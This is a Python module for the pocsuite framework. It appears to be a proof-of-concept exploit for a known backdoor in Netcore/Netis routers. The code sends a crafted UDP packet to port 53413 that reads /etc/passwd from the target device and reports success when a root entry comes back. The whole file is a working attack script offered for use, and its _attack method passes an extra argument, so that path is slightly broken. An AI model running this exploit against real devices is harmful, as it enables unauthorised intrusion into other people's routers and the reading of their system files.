#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
from pocsuite.api.utils import url2ip
import socket
import re

class TestPOC(POCBase):
    name = "Netcore/Netis UDP 53413 RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'Command execution'
    version = '1.0'  # default version: 1.0
    references = 'https://www.seebug.org/vuldb/ssvid-90227'
    desc = 'Exploits Netcore/Netis backdoor functionality that allows executing commands on operating system level.'


    vulDate = ''
    createDate = '2017-10-20'
    updateDate = '2017-10-20'

    appName = 'Netcore/Netis'
    appVersion = 'Netcore/Netis'
    dork = ''
    appPowerLink = 'http://www.netcoretec.com/'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = url2ip(self.url)
        payload = "AA\x00\x00AAAA/etc/passwd\x00"
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10.0)


        sock.sendto(payload, (url, 53413))
        response = sock.recv(1024)
        results = re.search("root:x:0:0:.*", response)

        if results:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
